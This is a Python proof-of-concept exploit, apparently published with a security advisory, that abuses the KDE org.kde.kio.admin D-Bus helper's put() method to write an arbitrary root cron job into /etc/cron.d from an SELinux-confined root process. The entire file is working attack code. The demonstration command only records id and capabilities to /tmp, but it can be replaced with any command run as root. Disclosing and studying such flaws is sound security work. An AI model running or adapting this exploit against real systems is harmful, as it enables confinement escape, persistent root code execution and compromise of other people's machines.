#!/usr/bin/env python3
#
# LinnemanLabs - kio.admin arbitrary file write (KDE helper) PoC
#
# https://linnemanlabs.com/posts/confined-root-is-still-root/
# https://github.com/linnemanlabs/advisories/
#
# org.kde.kio.admin's put() creates/overwrites a file by streaming data through the
# KIO put protocol (start -> dataRequest -> data(chunk) -> data(empty=EOF) -> result).
# python (dbus + glib) so it runs from a confined foothold
#
# Not KAuth - raw D-Bus to a custom PolkitQt1 interface gated by polkit, self-passed by uid-0.
# reach: any uid-0 daemon that can send to the kio.admin D-Bus name (where kio-admin is installed).
#
# put() auto-labels new files (parent-dir inheritance) which is what this PoC uses.
# copy() preserves the source files label, so it has specific use-cases.
#
import sys, dbus, dbus.mainloop.glib
from gi.repository import GLib

# the command cron runs as root (system_cronjob_t). example save id/status to /tmp/
CMD = "{ id; grep ^Cap /proc/self/status; } > /tmp/kio.out"
# destination - example path under /etc/cron.d auto-labels system_cron_spool_t
DEST = "file:///etc/cron.d/kio_poc"

PAYLOAD = ("* * * * * root " + CMD + "\n").encode()

dbus.mainloop.glib.DBusGMainLoop(set_as_default=True)
bus = dbus.SystemBus()

try:
    with open("/proc/self/attr/current") as f:
        print("caller-domain:", f.read().strip("\x00\n"))
except OSError:
    pass

# put() -> job object path. flags 5 = KIO Overwrite(4)|HideProgressInfo(1). introspect=False
# skips the Introspect call (SELinux denies it to a confined caller, the methods still work)
adm = dbus.Interface(bus.get_object("org.kde.kio.admin", "/", introspect=False), "org.kde.kio.admin")
job = adm.put(DEST, 0o644, 5)
print("kio.admin put()   : job=%s" % job)
put = dbus.Interface(bus.get_object("org.kde.kio.admin", job, introspect=False), "org.kde.kio.admin.PutCommand")

loop = GLib.MainLoop()
state = {"sent": False, "rc": 1}

def on_data_request():
    if not state["sent"]:
        state["sent"] = True
        print("                  : dataRequest -> send payload")
        put.data(dbus.ByteArray(PAYLOAD))
    else:
        # empty = EOF
        put.data(dbus.ByteArray(b""))

def on_result(err, msg):
    # err=0 is success
    e = int(err)
    print("                  : result err=%d%s" % (e, (" " + str(msg)) if e else ""))
    state["rc"] = e
    loop.quit()

bus.add_signal_receiver(on_data_request, signal_name="dataRequest",
                        dbus_interface="org.kde.kio.admin.PutCommand", path=job)
bus.add_signal_receiver(on_result, signal_name="result",
                        dbus_interface="org.kde.kio.admin.PutCommand", path=job)

put.start()
# timeout if no result signal
GLib.timeout_add_seconds(8, loop.quit)
loop.run()
sys.exit(state["rc"])
